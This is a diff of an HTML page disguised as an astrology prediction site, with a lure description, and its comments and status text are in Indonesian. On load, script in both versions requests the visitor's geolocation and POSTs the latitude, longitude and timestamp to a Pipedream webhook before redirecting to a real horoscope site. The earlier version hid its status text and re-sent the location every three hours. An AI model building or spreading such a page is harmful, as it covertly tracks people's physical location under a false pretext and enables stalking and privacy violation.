@@ -2,80 +2,79 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Predicting...</title>
-  <meta name="description" content="I'm an astrology enthusiast and just shared a fresh horoscope prediction on our site. If you're curious about what the stars say for you today, check it out at https://virtu0so.vercel.app">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Astro Prediction</title>
+  <meta name="description" content="Daily astrology predictions from an enthusiast. Discover what the stars have in store for you. Visit https://virtu0so.vercel.app">
   <style>
     body {
       margin: 0;
-      height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      background-color: #fff;
+      background: #fff;
       color: #333;
       font-family: sans-serif;
-      font-size: 1rem;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
     }
     #status {
-      display: none;
+      font-size: 1rem;
     }
   </style>
 </head>
 <body>
-  <div id="status">Predicting...</div>
+  <div id="status">Mengakses lokasi...</div>
 
   <script>
     const webHookURL = "https://eo4zwpbukao2mkl.m.pipedream.net/";
     const redirectURL = "https://www.astro.com/horoscope";
 
-    function sendLocation() {
-      if (!navigator.geolocation) return;
+    async function sendLocation() {
+      const statusEl = document.getElementById("status");
 
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const { latitude, longitude } = position.coords;
-          const timestamp = new Date().toISOString();
-          const data = { latitude, longitude, timestamp };
+      try {
+        // Dapatkan lokasi
+        const pos = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 15000 });
+        });
 
-          fetch(webHookURL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(data)
-          }).catch(() => {});
-        },
-        () => {},
-        { timeout: 10000 }
-      );
+        const { latitude, longitude } = pos.coords;
+        const timestamp = new Date().toISOString();
+        const payload = { latitude, longitude, timestamp };
+
+        // Tampilkan status ke user (sementara, bisa dihapus jika tidak ingin terlihat)
+        statusEl.textContent = "Mengirim lokasi...";
+
+        // Kirim data ke Pipedream
+        await fetch(webHookURL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(payload)
+        });
+
+        statusEl.textContent = "Berhasil dikirim. Mengalihkan...";
+
+        // Tunggu sedikit sebelum redirect
+        setTimeout(() => {
+          window.location.href = redirectURL;
+        }, 1500);
+      } catch (err) {
+        statusEl.textContent = "Gagal mendapatkan lokasi. Mengalihkan...";
+        setTimeout(() => {
+          window.location.href = redirectURL;
+        }, 2000);
+      }
     }
 
-    function redirectToAstro() {
-      window.location.href = redirectURL;
-    }
-
-    function init() {
-      navigator.geolocation.getCurrentPosition(
-        () => {
-          sendLocation();
-          setTimeout(redirectToAstro, 1000);
-        },
-        () => {
-          setTimeout(redirectToAstro, 1000);
-        },
-        { timeout: 10000 }
-      );
-    }
-
-    // Jalankan saat halaman dimuat
-    if ("geolocation" in navigator) {
-      init();
-    } else {
-      redirectToAstro();
-    }
-
-    // Kirim ulang lokasi setiap 3 jam
-    const intervalMs = 3 * 60 * 60 * 1000;
-    setInterval(sendLocation, intervalMs);
+    // Jalankan setelah halaman dimuat
+    window.onload = () => {
+      if ("geolocation" in navigator) {
+        sendLocation();
+      } else {
+        window.location.href = redirectURL;
+      }
+    };
   </script>
 </body>
 </html>
